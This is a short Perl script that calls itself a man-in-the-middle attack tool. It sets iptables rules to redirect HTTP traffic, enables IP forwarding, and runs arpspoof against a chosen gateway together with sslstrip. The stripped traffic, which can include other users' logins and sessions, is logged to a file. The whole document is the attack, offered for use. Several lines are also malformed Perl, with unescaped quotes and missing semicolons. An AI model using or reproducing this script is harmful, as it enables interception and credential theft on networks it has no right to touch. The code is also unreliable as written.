#!usr/bin/perl
use Term::ANSIColor;
############################################################################
print "**************************************************************\n";  #
print "+ -==                        JULI                        ==- +\n";  #
print "+ -==          Man-in-the-middle  Attack Script          ==- +\n";  #
print "+-------------------------------- http://blog.em616.com ---- +\n\n";#
print "**************************************************************\n";  #
############################################################################

# Cleaning stuff
system "killall -9 sslstrip arpsoff";
system "echo "0" > /proc/sys/net/ipv4/ip_forward"
system "iptables --table nat --flush"
system "iptables --flush";
system "iptables --delete-chain";
system "iptables --table nat --delete-chain";

#Making a Firewall, setting iptables roule to redirect port 80 to 5254
print color("bold red"), "Setting up the iptables roulle\n", color("reset");
print color("bold red"), ". . ..\n", color("reset");
system "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 5254";
#Port Fawarding
print color("bold red"), "Setting up port fawarding on our box\n", color("reset");
system "echo "1" > /proc/sys/net/ipv4/ip_forward";
## Arpspoof Script, must specify your interface and router IP
if ($#ARGV < 0) {
    print q{
Enter your interface and router ip, Ex:
en@em616:~$ perl juli.pl wlan0 192.168.0.1
};
    exit;
} elsif ($#ARGV < 1) {
    print "You have not provided all of the arguments required\n";
    print color("bold green"), "perl juli.pl wlan0 192.168.0.1\n", color("reset");
    exit;
}

$interface = $ARGV[0];
$getway = $ARGV[1];
print color("bold red"), "Starting arpsoof on interface: $interface ip: $getway \n", color("reset");
system "arpspoof -i $interface $getway &  sslstrip -a -k -l 5254 -w Juliscript.log";
print "Now let the script to do hes work, and check Juliscript.log if we found somethin\n"
# LineAL ;) 
